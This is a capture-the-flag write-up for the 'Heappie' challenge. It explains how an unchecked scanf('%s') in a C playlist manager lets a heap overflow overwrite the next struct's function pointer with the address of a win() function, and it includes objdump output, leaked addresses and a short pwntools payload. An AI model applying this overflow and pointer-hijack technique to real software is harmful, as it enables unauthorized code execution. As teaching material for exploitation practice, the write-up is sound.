---
layout: Post
type: chall
---
# Heappie ⚪

<a class="back-link" href="../../">< Go back</a>

## Description

Heappie is a simple application that allows you to save and play your favorite songs. Find a way to exploit it and read the flag.

nc pwn.heroctf.fr 6000

Author : xanhacks

all files in [resources/](./resources) were provided.

## Challenge

We have access to the source code of a playlist manager written in C. There are obvious buffer overflow vulnerabilities in the code especially since most interactions with the user are done via `scanf("%s")`, here we will be exploiting this one:

```c
printf("Enter music description: ");
scanf("%s", music->description); // Overflow
```

Music is a struct, the playlist is a linked list of Music's:

```c
typedef struct Music {
    void (*play)(struct Music*);

    char title[32];
    char artist[32];
    char description[128];
} Music;

Music* playlist = NULL;
```

The fact that the last element in the struct is the one we can exploit via the vulnerable `scanf()` is great. Because the first value is a function pointer, the playlist is a linked list and there is not much going on in memory we can guess that blocks will be created in succession if done correctly, This means that overflowing the description field will write in the non existant next Music in the linked list.

Let's make an exploit that will pre-fill the `void (*play)(struct Music*);` for the next playlist element with the address of the `win()` function and then call the `play()` function.

Now that our theory is clear, let's go for dynamic analysis and actually creating the payload and exploit.

```bash
objdump -S heappie
#    00000000000011f9 <win>
#    000000000000127d <play_1>
#    00000000000012b3 <play_2>
#    00000000000012e9 <play_3>

nc pwn.heroctf.fr 6000
#    4. Show playlist
#    >> 4
#    Your playlist:
#     1. AAAA by BBBB (song: 0x55e44d0a32e9)
#     2. psum by dolor (song: (nil))
#     3. 1 by 2 (song: 0x55e44d0a32e9)
#     4. 3 by 2 (song: 0x55e44d0a327d)
```

Great so when we look at the playlist we can see the address that was randomly choosen for the `play()` function pointer.

From the ending values of those addresses we can see they align with what we see in the objdump, we can now calcualte the offset to point to the `win()` function.

In terms of pwntools here is what the generated payload will look like:

```python
b'A' * 128 + p64(int(memory_address[:-3] + "1f9", 16))
```

Let's go for the exploit, take a look at [exploit.py](./exploit.py).
